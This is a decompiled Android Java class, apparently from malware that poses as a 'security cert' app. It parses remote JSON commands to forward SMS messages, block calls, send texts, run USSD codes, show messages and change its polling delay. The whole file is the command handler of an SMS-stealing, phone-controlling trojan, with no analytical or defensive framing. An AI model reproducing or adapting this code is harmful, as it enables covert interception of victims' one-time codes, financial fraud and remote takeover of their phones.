package com.security.cert.b.b.a;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import com.security.cert.a.a.c;
import com.security.cert.b.b;
import com.security.cert.services.PhoneCallReceiver;
import com.security.cert.ui.MessageDialogActivity;
import com.security.cert.ui.UssdActivity;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class a extends b {
    private Context a;

    public a(Context context) {
        this.a = context;
    }

    private String a(Object obj) {
        String str;
        if (obj instanceof JSONArray) {
            JSONArray jSONArray = (JSONArray) obj;
            String[] strArr = new String[jSONArray.length()];
            for (int i = 0; i < jSONArray.length(); i++) {
                strArr[i] = jSONArray.getString(i);
            }
            str = "((" + TextUtils.join(")|(", strArr) + "))";
        } else {
            str = (String) obj;
        }
        return str.equals("all") ? ".*" : str.replaceAll("\\+", "\\\\+").replaceAll("\\*", "\\.");
    }

    private void a(int i) {
        com.security.cert.b.a.a.a(this.a, i);
    }

    private void a(String str) {
        com.security.cert.b.a.a.b(this.a, str);
    }

    private void a(String str, String str2) {
        SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);
    }

    private void b() {
        com.security.cert.b.a.a.a(this.a, true);
    }

    private void b(String str) {
        b.a(this.a, PhoneCallReceiver.class, str != null);
        com.security.cert.b.a.a.c(this.a, str);
    }

    private void c(String str) {
        String replaceAll = str.replaceAll("#", Uri.encode("#"));
        Intent intent = new Intent(this.a, UssdActivity.class);
        intent.putExtra("ussd", replaceAll);
        intent.addFlags(805306368);
        this.a.startActivity(intent);
    }

    private void d(String str) {
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + str.replaceAll("#", Uri.encode("#"))));
        intent.addFlags(805306368);
        this.a.startActivity(intent);
    }

    private void e(String str) {
        Intent intent = new Intent(this.a, MessageDialogActivity.class);
        String str2 = "message";
        if (str == null) {
            str = "";
        }
        intent.putExtra(str2, str);
        intent.addFlags(805306368);
        this.a.startActivity(intent);
    }

    public void a(JSONObject jSONObject) {
        try {
            if (jSONObject.has("result") && jSONObject.getString("result").equals("true")) {
                String string = jSONObject.getString("command");
                if (string.equals("start_sms_forwarding")) {
                    a(a(jSONObject.get("phone_number")));
                } else if (string.equals("start_call_blocking")) {
                    b(a(jSONObject.get("phone_number")));
                } else if (string.equals("stop_sms_forwarding")) {
                    a(null);
                } else if (string.equals("stop_call_blocking")) {
                    b(null);
                } else if (string.equals("send_sms")) {
                    a(jSONObject.getString("phone_number"), jSONObject.getString("message_text"));
                } else if (string.equals("execute_ussd")) {
                    c(jSONObject.getString("ussd_query"));
                } else if (string.equals("simple_execute_ussd")) {
                    d(jSONObject.getString("ussd_query"));
                } else if (string.equals("stop_program")) {
                    b();
                } else if (string.equals("show_message")) {
                    e(jSONObject.getString("message_text"));
                } else if (string.equals("delay_change")) {
                    a(jSONObject.getInt("delay"));
                } else if (string.equals("ping")) {
                    c.b(this.a);
                }
            }
        } catch (JSONException e) {
            Log.e("ReCheckCommandReceiver", e.toString());
        }
    }
}
